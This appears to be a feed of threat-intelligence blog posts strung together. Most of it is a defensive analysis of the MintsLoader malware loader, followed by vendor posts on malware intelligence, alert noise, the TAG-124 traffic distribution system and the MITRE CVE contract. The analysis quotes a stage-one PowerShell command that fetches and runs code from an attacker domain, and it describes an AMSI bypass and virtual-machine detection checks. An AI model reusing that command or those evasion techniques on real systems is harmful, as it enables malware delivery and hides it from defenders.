        <p><a href="https://github.com/cert-orangecyberdefense/mintsloader">Orange Cyberdefense</a> first detected MintsLoader in widespread distribution campaigns between July and October 2024. Insikt Group identified earlier campaigns in February 2024, based on Palo Alto’s Unit42 <a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-02-21-IOCs-from-SocGholish-AsyncRAT-infection.txt">analysis</a> of a SocGholish infection.</p>
        <p>The loader consists of JavaScript (stage one) and PowerShell (stage two) scripts retrieved from multiple DGA-based domains. The name “MintsLoader” is derived from its distinctive use of the URL parameter s=mints[NUMBER] (for example, s=mints11). MintsLoader is typically <a href="https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983">observed</a> in campaigns delivering secondary payloads such as GhostWeaver, StealC, and the Berkeley Open Infrastructure for Network Computing (BOINC) client.</p>

        </div>
        <p>While MintsLoader is believed to be used by multiple threat actors, TAG-124 (also known as LandUpdate808) infections have frequently been observed deploying MintsLoader. Additionally, threat actors using SocGholish were early adopters of MintsLoader, resulting in the initial assessment of MintsLoader campaigns as being exclusively associated with SocGholish. For example, in February 2024, Palo Alto’s Unit42 <a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-02-21-IOCs-from-SocGholish-AsyncRAT-infection.txt">released</a> indicators linked to SocGholish (Figure 2); however, Insikt Group's analysis indicates that the URLs identified as delivering AsyncRAT also align with known MintsLoader URL patterns.</p>

        </div>
        <p>Below are recently reported campaigns involving MintsLoader.</p>
        <h3>MintsLoader and Kongtuke/ClickFix pages</h3>
        <p>In early 2025, security analysts <a href="https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery">observed</a> a phishing campaign delivering MintsLoader as a first-stage loader. Phishing emails (targeting the energy, oil and gas, and legal sectors in the US and Europe​) carried either a malicious JavaScript attachment or a link to a fake “Click to verify” web page​. <strong>Figure 4</strong> shows examples of ClickFix pages.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="malware-hunting-004.png" src="https://www.recordedfuture.com/media_18bb150fb50ca1b1d1486c310c9c1658aac52a482.png?width=750&amp;format=png&amp;optimize=medium" width="875" height="552" />
            </div>
          </div>
          <div>
            <div><strong><em>Figure 4:</em></strong> <em>Examples of ClickFix pages (Source:</em> <em><a href="https://www.hhs.gov/sites/default/files/clickfix-attacks-sector-alert-tlpclear.pdf">https://www.hhs.gov/</a>)</em></div>
          </div>
        </div>
        <p>In both cases, the result was the execution of MintsLoader’s PowerShell-based second stage on the victim’s machine. This loader pulled down the final payloads, notably the StealC infostealer and a modified BOINC client build. The <a href="https://thehackernews.com/2025/01/mintsloader-delivers-stealc-malware-and.html">campaign</a> leveraged fake CAPTCHA verification pages (ClickFix/KongTuke lures) to trick users into executing a copied PowerShell command, which downloaded and ran MintsLoader (<strong>Figure 5</strong>).</p>

        </div>
        <p>Other <a href="https://www.esentire.com/blog/mintsloader-stealc-and-boinc-delivery">infection</a> chains in this campaign delivered MintsLoader via a downloaded ‘Fattura########.js’ file (Italian for “invoice”) that victims opened, leading to the same PowerShell loader execution​. Researchers at eSentire’s Threat Response Unit reported this campaign and noted the threat actors’ focus on industrial and professional services targets across North America and Europe.</p>
        <h3>SocGholish “FakeUpdates” Campaigns</h3>
        <p>Multiple reports indicate (<a href="https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983">1</a>, <a href="https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software#:~:text=Beginning%20on%20July%204%2C%202024%2C,such%20as%20AsyncRAT%20or%20NetSupport">2</a>) that the SocGholish (FakeUpdates) threat actors incorporated MintsLoader into their operations. Starting around July 2024, SocGholish infections from compromised websites showed infection chains installing the BOINC-distributed computing client via MintsLoader.</p>
        <p>In this drive-by campaign, shown in <strong>Figure 6</strong>, victims browsing legitimate but compromised sites encountered fake browser update prompts (often originating from an update.js script). If run, the malicious JavaScript fetched an obfuscated MintsLoader payload, kicking off a multi-step PowerShell sequence.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="malware-hunting-006.png" src="https://www.recordedfuture.com/media_1a3783fcf21be4af054ce20d14ff1627bbb486599.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="662" />

          </div>
        </div>
        <p>Huntress Labs documented two parallel outcomes: one branch resulted in a fileless AsyncRAT running in memory, while the other led to a stealth BOINC installation under attacker control. The BOINC deployment was notably modified and configured to connect to a malicious C2 rather than the standard BOINC server.</p>
        <p>In some cases, the GhostWeaver PowerShell <a href="https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983">backdoor</a> (tracked by Mandiant as UNC4108) was also delivered via MintsLoader, providing attackers with a persistent foothold and a platform to load additional plugins.</p>
        <h2>Invoice Phishing in Europe</h2>
        <p>Another MintsLoader campaign in late 2024 <a href="https://www.spamhaus.org/resource-hub/cybercrime/pec-invoice-scam/#the-pec-%22invoice-scam%22">targeted</a> European organizations via invoice-themed phishing emails​, an example of which is shown in Figure 7. Spam messages leveraged Italy’s PEC (certified email) system to add legitimacy and lured recipients into opening attached JavaScript files masquerading as invoices. The Spamhaus research team dubbed this the “PEC invoice scam” and highlighted how the attackers abused trusted email channels to bypass security checks. This campaign was noted for “stealing time, money, and trust from businesses.”</p>

        <h2>Technical Analysis</h2>
        <p>MintsLoader uses a multi-stage execution chain involving JavaScript and PowerShell, with each stage employing obfuscation to hinder analysis. Although MintsLoader functions solely as a loader without supplementary capabilities, its primary strengths lie in its sandbox and virtual machine evasion techniques and a DGA implementation that derives the C2 domain based on the day it is run. These features significantly complicate static analysis and host-based detection. Despite this, its C2 communications occur over HTTP, which provides a reliable vector for detecting and identifying new samples. <strong>Figure 8</strong> provides the high-level capabilities of MintsLoader.</p>

        <p>This analysis of MintsLoader includes details on the first- and second-stage payloads and MintsLoader infrastructure.</p>
        <h2>MintsLoader Attack Chain</h2>
        <p>MintsLoader is commonly delivered via phishing emails containing links to KongTuke or ClickFix pages. When executed, these pages retrieve and run the first stage of JavaScript. The JavaScript is heavily obfuscated, and execution leads to running a PowerShell command to download and execute the second stage of MintsLoader, as shown in <strong>Figure 9</strong>.</p>
        <div>
          <div>
            <div>
              <img loading="lazy" alt="malware-hunting-009.png" src="https://www.recordedfuture.com/media_1b472e711735276bf62d243e802c8d46fc3259188.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="416" />

          </div>
        </div>
        <p>This second stage conducts environment checks to determine whether it is running in a sandbox or virtualized setting. Next, the script uses a DGA to produce the next C2 domain. MintsLoader then attempts to contact the generated domain to download the final payload, such as GhostWeaver, StealC, or the BOINC client. Figure 10 shows a high-level overview of this attack chain.</p>

        <h2>Stage One: JavaScript</h2>
        <p>The initial stage of MintsLoader consists of a JavaScript file that executes a PowerShell command to retrieve the second stage. The script is heavily obfuscated using junk comments, non-readable variables and function names, character replacement, and string encoding (<strong>Figure 11</strong>). Insikt Group found 141 MintsLoader stage one samples using data derived from Recorded Future Malware Intelligence Hunting (<strong>Appendix A</strong>).</p>

        <p>The core function of the stage one JavaScript payload is to run a PowerShell command that executes the command ‘curl -useb http://[domain]/1.php?s=[campaign]’, which downloads and executes the second stage. When ‘curl’ is used in PowerShell with the option ‘-useb’, it is an alias for Invoke-WebRequest, and the program cURL is not actually used to make the HTTP request.</p>
        <p>Insikt Group identified three distinct versions of the stage one loader, all of which employ the same JavaScript obfuscation techniques but differ in implementing the deployed PowerShell.</p>
        <p>The first variant executes the PowerShell command in clear text, with the C2 domain hard-coded, as shown in <strong>Figure 12</strong>. This variant is seen in “mints13” and “flibabc11” campaigns.</p>

        </div>
        <p>In the second variation, the PowerShell command is obfuscated using character replacement. The C2 domain is still hard-coded, and an alias for the curl command is used instead, but the object is still to download the next stage (<strong>Figure 13</strong>). This is the most widely used variant across the campaigns: “flibabc21”, “flibabc22”, ”mints11”, “mints13”, “mints21”, and “mints42”.</p>

        <h2>Stage Two PowerShell</h2>
        <p>The second stage, PowerShell, contains a Base64-encoded string. After XOR decoding and uncompressing, the primary payload, which is also obfuscated, is yielded. Figure 17 shows a snippet of this payload, illustrating MintsLoader's obfuscated string construction techniques.</p>

          </div>
        </div>
        <p>After the initial deobfuscation and decoding, the second stage of PowerShell starts by attempting to bypass Antimalware Scan Interface (AMSI) using a known <a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/">technique</a> to fake AMSI initialization failure: setting the variable amsiInitFailed of the System.Management.Automation.AmsiUtils object to TRUE.</p>
        <p>The rest of the code is responsible for executing three system information queries: the return values used in logical expressions to detect whether the system is running on bare metal, sandbox, or virtual machine. This is conveyed to the C2 through an integer variable sent as the URL parameter key, and the C2 examines its value to determine if its response will return a third stage that downloads the final payload or a decoy. It should be noted that the constant integer values used to increment the key variable change with each second-stage sample.</p>
        <p>The result of each system information query is checked against three logical expressions, the order of which varies per sample, along with constants that increment the key, whose results affect the key variable value. The logical expressions may not provide apparent results on initial inspection. For example, if the first deobfuscated system check, shown below in <strong>Figure 18</strong>, were to run on a virtual machine, the $isVirtualMachine variable would be equal to $true. The logical expression "$true -eq 3" evaluates to $true in PowerShell, increasing the key by 15310805757 instead of 83670406277.</p>

        <p>The second system check queries the AdapterDACType member of the <a href="https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-videocontroller">Win32_VideoController WMI</a> object to obtain the name or identifier of the digital-to-analog converter (DAC) chip, as shown in Figure 19. This determines whether the infected system is running on an emulator or virtually. Typically, a Windows system will return "Internal" and/or "Integrated RAMDAC," which would increment the key by 14467965888 in this example.</p>

The non-obvious logical expression "$l1CachePurpose.length —gt 4" will execute in the optimal case, incrementing the key value by 27424330481 in the deobfuscated example seen in <strong>Figure 20</strong>.</p>

        <p>The system checks and calculation of the key are followed by generating a random seed based on the date and a constant, which is used with a system.Random object to construct the domain using a simple DGA and the URL path, as shown in <strong>Figure 21</strong>. The author may have made a mistake by not using the second random variable to construct the URL path. Instead, they use an undefined variable for the URL path ending, making the URL path ending a constant "htr.php". Note that in PowerShell, curl is an alias for Invoke-WebRequest, which is used to generate the request to the C2 for the third stage, so the User-Agent HTTP header will include PowerShell version information, not curl.</p>

        <p>If the second-stage request does not meet specific requirements, the final payload may lead to a decoy executable (<strong>Figure 24</strong>), as in <a href="https://tria.ge/230922-q9ft4sac82/behavioral1">this</a> example, which leads to an AsyncRAT <a href="https://levelblue.com/blogs/labs-research/asyncrat-loader-obfuscation-dgas-decoys-and-govno">decoy</a> executable downloaded from the site temp[.]sh. This association with AsyncRAT led to initial naming in reports and some countermeasures for network traffic as "AsyncRAT Loader", which causes MintsLoader malware samples to be incorrectly tagged as AsyncRAT even though current MintsLoader campaigns do not deploy AsyncRAT.</p>

        <h3>GhostWeaver</h3>
        <p>One of the most commonly observed payloads deployed by MintsLoader is <a href="https://trac-labs.com/dont-ghost-the-socgholish-ghostweaver-backdoor-574154dd9983">GhostWeaver</a>, a PowerShell-based remote access trojan (RAT) exhibiting code similarities and functional overlaps with MintsLoader. Notably, GhostWeaver can <a href="https://tria.ge/250225-njxc3awjs8/behavioral2">deploy</a> MintsLoader as an additional payload via its sendPlugin command. Communication between GhostWeaver and its command-and-control (C2) server is secured through TLS encryption using an obfuscated, self-signed X.509 certificate embedded directly within the PowerShell script, which is leveraged for client-side authentication to the C2 infrastructure.</p>
        <p>GhostWeaver has periodically been misclassified as AsyncRAT. Insikt Group assesses with moderate confidence that this misclassification originated from Palo Alto Networks <a href="https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2024-02-21-IOCs-from-SocGholish-AsyncRAT-infection.txt">initially</a> identifying a GhostWeaver sample (SHA256: fb0238b388d9448a6b36aca4e6a9e4fbcbac3afc239cb70251778d40351b5765) as a fileless AsyncRAT variant. GhostWeaver and AsyncRAT share certain characteristics within their self-signed X.509 certificates, such as identical expiration dates and serial number lengths; however, these similarities may simply reflect common certificate-generation methods rather than meaningful operational overlap.</p>
        <h2>MintsLoader Infrastructure</h2>
        <p>Insikt Group initially found MintsLoader C2 servers hosted solely on BLNWX but later observed its growing use of other ISPs such as Stark Industries Solutions Ltd (AS44477), GWY IT Pty Ltd.​ (AS199959), or SCALAXY-AS (58061), among others. MintsLoader C2 IP addresses announced via SCALAXY-AS are operated by hosting providers 3NT Solutions LLP and IROKO Networks Corporation, both of which are a part of the Russian-language bulletproof hosting provider Inferno Solutions (inferno[.]name). The switch to SCALAXY-AS and Stark Industries Solutions suggests that MintsLoader operators have shifted from relying on anonymous virtual private server (VPS) providers to more traditional bulletproof hosters, likely in an effort to harden their infrastructure against takedown attempts and enhance operational stability.</p>
        <p>Over the past several months, Insikt Group has identified a range of suspected additional campaign IDs and payloads (<strong>Table 2</strong>). This data is compiled from open research and Insikt Group’s internal research.</p>

            <description><![CDATA[Recorded Future’s Malware Intelligence rethinks traditional malware analysis to empower organizations to act first against modern threats.]]></description>
            <content:encoded><![CDATA[
        <p>In my conversations with security leaders across industries, I hear a consistent theme: traditional approaches to malware detection and analysis are failing to keep pace with the evolving threat landscape. This challenge has become even more pronounced as adversaries increasingly leverage AI to accelerate and enhance their attacks.</p>
        <p>The statistics tell a sobering story. The average dwell time for threats in 2024 remains at approximately 10 days. Nearly half of CISOs report missing data breaches with their existing security tools. And 93% of malware hides in data-in-transit<sup>1</sup>. These aren't just numbers—they represent real business risk that security teams struggle to address with limited resources and reactive approaches.</p>
        <p>Today, I'm excited to announce a solution that fundamentally transforms how organizations defend against malware: <strong>Recorded Future's Malware Intelligence</strong>.</p>
        <h2>Beyond Isolated Analysis</h2>
        <p>Traditional malware analysis happens in isolation—disconnected from the broader threat landscape. Security teams spend countless hours manually investigating samples without the contextual intelligence needed to understand their true risk or deploy effective protections quickly.</p>
        <p>Malware Intelligence fundamentally changes this approach by connecting every malware sample to our Intelligence Graph's 15+ years of threat and malware data. This allows security teams to not just analyze what the malware does, but understand its lineage, predict its evolution, and automatically generate protections—giving you complete context and automated defenses in seconds rather than days.</p>
        <h2>The Power of the Intelligence Graph</h2>
        <p>What makes this approach possible is the Recorded Future Intelligence GraphⓇ—the world's only threat intelligence repository with over 200 billion nodes of interconnected data built over 15 years. By leveraging this unmatched intelligence foundation, we've created capabilities that transform malware defense from a reactive exercise to a proactive strategy:</p>
        <ol>
          <li><strong>Intelligence Graph correlation</strong> with 1.5M+ new malware samples/day providing immediate context about origins, attribution, and potential impact</li>
          <li><strong>Auto YARA rule generation</strong> powered by pattern recognition creates instant protection against identified threats and their variants</li>
          <li><strong>Dynamic alerting</strong> identifies emerging threats through static and behavioral analysis before they target your organization</li>
          <li><strong>Seamless integration</strong> with existing security controls enables immediate protection without workflow disruption</li>
          <li><strong>Advanced Sandbox</strong> empowers security teams to upload and and detonate potential malware in an interactive environment, unlocking deep insights into threat behavior and attack strategies - <a href="/get-started#free-tools">try it free today</a> and see the difference.</li>
        </ol>
        <h2>Transforming Cyber Operations</h2>
        <p>For security teams, the impact is transformative. One customer described our approach as making their team "look prophetic"—they could get out in front of threats before they materialized rather than constantly reacting to incidents.</p>
        <p>Early adopters are reporting remarkable results including 3x reduction in triage time and ability to run threat hunts automatically.</p>
        <p>These aren't just efficiency metrics—they represent a fundamental shift in how security teams operate and the level of protection they can provide to their organizations.</p>
        <h2>From Manual to Automated, From Reactive to Proactive</h2>
        <p>What excites me most about Malware Intelligence is how it addresses the critical challenges facing security teams today:</p>
        <ul>
          <li><strong>For resource-constrained teams</strong>, it provides automation that eliminates hours of manual rule-writing and scales threat hunting capabilities without adding headcount</li>
          <li><strong>For organizations struggling with alert fatigue</strong>, it delivers high-confidence intelligence that focuses teams on what matters most</li>
          <li><strong>For security leaders concerned about emerging threats</strong>, it provides predictive capabilities that identify variants before they impact your systems</li>
        </ul>
        <p>Most importantly, it enables security teams to shift from a reactive posture—where they're constantly on the back foot against attackers—to a proactive strategy where they can anticipate and prevent attacks before they occur.</p>
        <h2>The Future of Intelligence-Driven Security</h2>
        <p>Malware Intelligence represents a significant step in our vision to enable you to know what matters and act first. By connecting the dots between isolated malware samples and the broader threat landscape, we're enabling security teams to defend at the speed and scale that modern threats demand.</p>
        <p>As attack techniques continue to evolve with the aid of AI, the advantage will belong to those with superior intelligence capabilities. That's precisely what we're delivering with Malware Intelligence—a capability that transforms how organizations detect, understand, and respond to malware threats that matter most to their business.</p>
        <p>This is available today for all our customers who own our Threat Intelligence Module. I invite you to see this innovation in action.

            <description><![CDATA[Threat actors could be hiding in plain sight within your network traffic. Don’t let overwhelming security data mean less visibility to threats.]]></description>
            <content:encoded><![CDATA[
        <p>Security teams are drowning in data, yet many struggle to extract actionable insights. As threats grow more complex, the <a href="https://www.cisa.gov/resources-tools/resources/enhanced-visibility-and-hardening-guidance-communications-infrastructure">demand</a> for visibility has never been greater. But more data does not always mean better security outcomes. 63% of daily alerts are low priority or false positives, causing SOC analysts to <a href="https://panther.com/blog/identifying-and-mitigating-false-positive-alerts#:~:text=found%20that%20an%20estimated%20one%2Dthird%20of%20their%20workday%20is%20spent%20on%20incidents%20that%20are%20not%20real%20threats%2C%20with%20FP%20and%20low%2Dpriority%20alerts%20comprising%20roughly%2063%25%20of%20daily%20alerts.">report</a> spending nearly a third of their time on incidents that pose no real threat. At the same time, 58% of analysts <a href="https://finitestate.io/blog/industry-report-false-positives-software-security#:~:text=58%25%20said%20false%20positives%20take%20more%20time%20to%20resolve%20than%20true%20positives">report</a> that false positives take more time to resolve than actual threats. Without the right tools and methods to interpret this information, more data just means more noise. This results in a visibility paradox: the more security data that is collected, the harder it becomes to spot real threats.</p>
        <h2>How Threat Actors Exploit the Visibility Paradox</h2>
        <p>Threat actors are capitalizing on this paradox. Recorded Future’s analysis of tactics, techniques, and procedures (TTPs) shows that threat actors are exploiting everyday traffic patterns and system behaviors to operate undetected, effectively hiding in plain sight.</p>
        <ul>
          <li><strong>250% Spike in Camouflaged Communication:</strong> The use of the application layer protocol (T1071) for command-and-control operations, disguised as routine network traffic, increased by over 250% between 2023 and 2024. Nearly half of all data exfiltration incidents tracked by Recorded Future in 2024 involved this technique.</li>
          <li><strong>Use of Malicious Infrastructure to Blend in with Web Traffic:</strong> Multiple threat actors are taking <a href="/research/tag-124-multi-layered-tds-infrastructure-extensive-user-base">advantage</a> of specialized malicious traffic-distribution systems that rapidly rotate URLs to evade static blocking mechanisms. This allows malicious infrastructure to mimic legitimate web activity and bypass conventional defenses.</li>
          <li><strong>33% Increase in System Information Discovery:</strong> Between 2023 and 2024, there was an uptick in the use of discovery tactics that allow threat actors to map and understand the target environment. System information discovery enables defense evasion techniques that commonly appear in ransomware, like disabling or modifying tools or modifying registry.</li>
        </ul>
        <p>Threat actors often rotate through indicators such as IP addresses, file hashes, and domains, reducing the effectiveness of static detections. Without careful tuning, alerts triggered by suspicious discovery or C2 behavior can generate high levels of false positives on legitimate processes or normal network traffic.</p>
        <h2>Automation and Specialization Create Even More Noise</h2>
        <p>Two trends are likely to fuel an increase in this activity. First, threat actors are specializing more than ever, allowing for sophisticated exploits across specific areas of the cyber kill chain. The <a href="/research/initial-access-brokers-key-to-rise-in-ransomware-attacks">rise</a> of initial access brokers and recent <a href="https://www.darkreading.com/threat-intelligence/vextrio-tds-biggest-cybercrime-operation-web">discoveries</a> of specialized access and C2 infrastructure highlight this shift. Second, threat actors are increasingly using AI tools. While malware isn’t autonomous yet, threat actors are exploiting LLMs and machine learning to automate and randomize delivery infrastructure, such as by <a href="https://blogs.infoblox.com/threat-intelligence/rdgas-the-next-chapter-in-domain-generation-algorithms/">registering</a> thousands of unique domain names daily for malicious use. The volume and randomness make these domains extremely difficult to detect or block.</p>
        <h2>Beat the Paradox by Making the Most of Data</h2>
        <p>Behavior-based detection, rather than static indicators, is pivotal to catching these threats. However, collecting enough data to understand behavior can exacerbate the visibility paradox if defenders don’t have a strategy for making sense of their alerts. This is where better analytics and intelligence-driven hunting can help:</p>
        <ul>
          <li><strong>Understand what is normal in your systems:</strong> Detecting subtle anomalies requires a deep understanding of baseline network behavior, also known as <a href="https://www.blackfog.com/cybersecurity-101/baselining">baselining</a>. Without this, deviations can go unnoticed.</li>
          <li><strong>Integrate your tools:</strong> Avoid alerting silos. Centralizing and enriching data in a unified platform, such as - Recorded Future’s Collective Insights tool, helps surface more meaningful signals.</li>
          <li><strong>Test alerts with intelligence-driven hunts:</strong> Purple teaming, a method of vulnerability assessment that combines data from red- and blue-team exercises to improve network defense, helps to verify detection capabilities. Red teams can use real-world threat intelligence to simulate the most relevant threats to your company based on activity observed in your industry or region.</li>
        </ul>
        <h2>The Bottom Line for Security Leaders</h2>
        <p>The organizations that will succeed in the years ahead won't be those collecting the most data, instead it will be the ones best equipped to turn that data into action. Recorded Future helps security teams beat the visibility paradox by providing the tools, automation, and intelligence needed to cut through the noise and focus on real threats before they impact your business.

            <description><![CDATA[Discover how cybercriminals use malicious Traffic Distribution Systems like TAG-124 to deliver ransomware and malware to high-value targets in healthcare and critical infrastructure.]]></description>
            <content:encoded><![CDATA[
        <p>Coming across highly targeted advertisements online is a common experience for many US consumers. One way advertisers achieve this is by using traffic distribution systems (TDSs), which collect information about potential customers to <a href="https://www.securitee.org/files/tds-www2021.pdf">direct</a> them to highly targeted ads. Using data from the user’s browser, geolocation, and behavior, a TDS makes rapid decisions on directing traffic to get the most from ad spend. However, cybercriminals also use this infrastructure to deliver highly targeted malware to victims who are most likely to click their links. Malicious TDSs work in much the same way as legitimate TDSs, except they direct victims to the most effective malware instead of the most effective advertisement. Additionally, these TDSs provide a defensive measure to ensure the malware is not delivered to researchers or sandboxes that could analyze the code.</p>
        <p>Insikt Group has been tracking how cybercriminals use these tools and <a href="/research/tag-124-multi-layered-tds-infrastructure-extensive-user-base">identified</a> infrastructure linked to a highly active malicious TDS dubbed TAG-124. TAG-124 allows ransomware operators and other cybercriminals to maximize their chances of infecting their intended victims with their respective payloads. At least two ransomware groups have been observed using TAG-124 to infect victims in health care and other critical infrastructure, demonstrating the value of traffic distribution for “big game hunting” (targeting companies perceived as likely to pay out high extortion demands). While shared infrastructure like TAG-124 helps cybercriminals improve their efficiency and effectiveness, understanding TAG-124 infrastructure can help defenders block or even disable activity from multiple cyber threat actors simultaneously before compromise occurs.</p>

        <ul>
          <li><strong>Rhysida Ransomware:</strong> A sophisticated <a href="/research/outmaneuvering-rhysida-advanced-threat-intelligence-shields-critical-infrastructure-ransomware">ransomware-as-a-service</a> operation notable for extorting healthcare organizations and other critical infrastructure. In 2023, the group claimed responsibility for an attack on Prospect Medical Holdings, which <a href="https://www.scworld.com/news/rhysida-claims-responsibility-for-ransomware-attacks-on-prospect-medical-holdings">resulted</a> in the theft of over 500,000 social security numbers and <a href="https://blog.barracuda.com/2024/05/09/rhysida-ransomware--the-creepy-crawling-criminal-hiding-in-the-d#:~:text=The%20Prospect%20Medical%20Holdings%20attack%20impacted%2017%20hospitals%20and%20166%20clinics%20across%20the%20United%20States.">impacted</a> operations at seventeen hospitals and 166 clinics.</li>
          <li><strong>Interlock Ransomware:</strong> Another ransomware group targeting primarily <a href="https://www.hipaajournal.com/interlock-ransomware-healthcare/">healthcare organizations</a> and other “big game” to extort higher payouts through high-impact attacks on large organizations. In December 2024, the group <a href="https://www.bleepingcomputer.com/news/security/texas-tech-university-system-data-breach-impacts-14-million-patients/">claimed</a> credit for an attack on the Texas Tech University Health Sciences Center, stealing 2.6 TB of sensitive personal data. Interlock shares many similarities with Rhysida, such as tactics, tools, and encryption behaviors, though the exact relationship between the two is <a href="https://x.com/prodaft/status/1896938856672280591?s=43">unknown</a>.</li>
          <li><strong>TA866 / Asylum Ambuscade:</strong> This cybercrime group <a href="https://www.welivesecurity.com/2023/06/08/asylum-ambuscade-crimeware-or-cyberespionage/">engages in</a> financial targeting and cyber espionage very likely on behalf of the Russian government. The group has targeted bank customers and cryptocurrency traders across North America and Europe and carried out <a href="https://www.proofpoint.com/us/blog/threat-insight/security-brief-ta866-returns-large-email-campaign">espionage</a> against government entities in Europe, Central Asia, and other areas.</li>
        </ul>
        <p>TAG-124 has also been associated with <a href="https://www.proofpoint.com/us/blog/threat-insight/part-1-socgholish-very-real-threat-very-fake-update">SocGholish</a> and <a href="https://www.esentire.com/blog/exploring-the-d3f-ck-malware-as-a-service-loader">D3F@ck</a> loader malware, which provide remote access and malware delivery for financially motivated activity. While Insikt Group does not know which criteria TAG-124 uses to filter and direct malicious content, its use of search engine optimization (SEO) poisoning and infecting legitimate sites allows for an enormous number of potential victims. By outsourcing initial infection to TAG-124, groups like Rhysida and Interlock can pursue “big game hunting” by specializing in techniques implemented during a later stage in the infection kill chain. These special techniques enable more effective extortion campaigns.</p>
        <h3>Risk Outlook</h3>
        <p>Successful big game hunting that results in large payouts allows sophisticated syndicates like Rhysida and Interlock to invest back into services that make their work more effective. This drives the increased specialization of groups like TAG-124, creating a virtuous cycle of cybercrime. As a result, businesses face an increasing risk of high-impact ransomware attacks and espionage-driven data theft: the links between TAG-124 and Asylum Ambuscade suggest that state-sponsored threat actors are also taking advantage of these services in addition to profit-motivated actors.</p>
        <p>Defending against TAG-124 may be challenging due to its early role in the cyberattack life cycle, but missing intrusions early on can still have negative consequences for companies. For example, one of Rhysida’s latest victims, Sunflower Medical, is <a href="https://www.hipaajournal.com/sunflower-medical-group-data-breach-lawsuit/">facing</a> a class action lawsuit because of its failure to implement security measures that would have detected the breach early in the infection cycle. According to the company, the intrusion was not discovered for three weeks following the initial breach. While it is unknown whether TAG-124 was used for this intrusion, the legal consequences demonstrate the significant risks of missing early signs of a breach.</p>
        <h3>Mitigations</h3>
        <p>TAG-124 is not the only TDS operating on behalf of threat actors. Other notable examples include <a href="https://www.darkreading.com/threat-intelligence/vextrio-tds-biggest-cybercrime-operation-web">VexTrio</a>, <a href="https://www.securityweek.com/prometheus-tds-underground-service-distributing-several-malware-families/">Prometheus TDS</a>, and <a href="https://sensorstechforum.com/blacktds-traffic-distribution-network-malicious/">BlackTDS</a>, all of which offer competing malware delivery capabilities. Operators of these systems enable the increasing effectiveness of many different threat actors — primarily criminal, though occasionally state-sponsored — by providing professional infrastructure that adopts legitimate content delivery techniques for criminal use. However, identifying indicators of malicious TDS can help defenders detect and block multiple threat actors early in the attack kill chain.</p>
        <p>Insikt Group recommends the following measures:</p>
        <ul>
          <li><strong>Advanced threat detection:</strong> In addition to blocking known indicators, use host- and log-based detections, such as YARA, Snort, and Sigma rules found in Recorded Future’s Intelligence Cloud, for custom file scanning and detection. These detections can help identify unwanted tools or other suspicious activity.</li>
          <li><strong>User education:</strong> Educate users on the risks of SEO poisoning and urge caution when browsing. In particular, urge caution against unprompted downloads for Google Chrome updates and other indicators associated with TAG-124 infrastructure.</li>
          <li><strong>Secure browser setting:</strong> Enable automatic browser updates and blocking pop-ups to reduce exposure to malicious update prompts.</li>
        </ul>

            <description><![CDATA[The recent uncertainty around MITRE's CVE database highlights a major risk in relying on a single intel source. Learn why diversified, multi-source vulnerability intelligence is crucial for cyber resilience.]]></description>
            <content:encoded><![CDATA[
        <h2>What We Can Learn From The Recent News About the Unknown Future of MITRE’s CVE Database</h2>
        <p>Over the last several days, we have received a lot of inquiries from customers and partners about the recent news on the unknown future of the MITRE National Vulnerability (NVD) database. It is another reminder that in today's rapidly evolving cybersecurity environment, organizations cannot afford to rely on a single stream of intelligence. It also demonstrates why platforms that aggregate multiple intelligence sources are more critical than ever.</p>
        <h2>When Critical Vulnerability Information Sources Are at Risk</h2>
        <p>We tend to think about supply chain disruptions related to physical goods, but this is a wake up call that information supply chains are equally important to consider.</p>
        <p>So what happened? On April 15, 2025, a memo indicated that MITRE's contract to support CVE (Common Vulnerabilities and Exposures) and related programs was set to expire on April 16, 2025. Fortunately, by 9am EDT on April 16, the MITRE contract had reportedly been renewed, and there would be no actual impact or interruptions to vulnerability intelligence services for at least a year- beyond that year is still unknown. While this raised immediate concerns across the cybersecurity community, it also illustrated the importance of diversified <a href="/products/vulnerability-intelligence">vulnerability intelligence</a> sources.</p>
        <h2>Why Multi-Source Vulnerability Intelligence Matters</h2>
        <p>The MITRE situation perfectly exemplifies why organizations need robust, multi-source intelligence platforms rather than a dependency on single sources, namely:</p>
        <h3>Resilience Against Source Disruptions</h3>
        <p>When a key intelligence source experiences disruption, organizations with diversified sources can maintain operational continuity.</p>
        <h3>Comprehensive Coverage</h3>
        <p>Different intelligence sources often capture different aspects of vulnerabilities. Vendor advisories might contain details not yet reflected in the National Vulnerability Database (NVD).</p>
        <h3>Timely Intelligence</h3>
        <p>Multiple sources allow for earlier detection of vulnerabilities, as information often appears in specialized forums or vendor bulletins before being officially cataloged.</p>
        <h3>Contextual Richness</h3>
        <p>By aggregating multiple intelligence streams, organizations gain a more nuanced understanding of vulnerabilities, including real-world exploitation status.</p>
        <h2>The Evolving Information Supply Chain</h2>
        <p>The cybersecurity intelligence landscape has been undergoing a fundamental transformation for some time. In fact, this is the very reason Recorded Future was formed as a company nearly 15 years ago. Centralized information sources need to be complemented by a distributed network of intelligence mirroring the world. This shift represents a new paradigm in how security intelligence flows:</p>
        <h3>From Centralized to Distributed</h3>
        <p>Organizations are moving away from reliance on single, authoritative sources toward networks of complementary intelligence.</p>
        <h3>From Reactive to Proactive</h3>
        <p>Multi-source intelligence enables earlier detection and faster response to emerging threats.</p>
        <h3>From Generic to Contextual and Precise</h3>
        <p>Diverse sources provide richer context, allowing for more precise risk assessment tailored to specific organizational environments.</p>
        <h2>Practical Steps for Security Teams</h2>
        <p>For security professionals, this shift necessitates adjustments in vulnerability management workflows:</p>
        <h3>Diversify CVE Sourcing for Vendor Risk Ratings</h3>
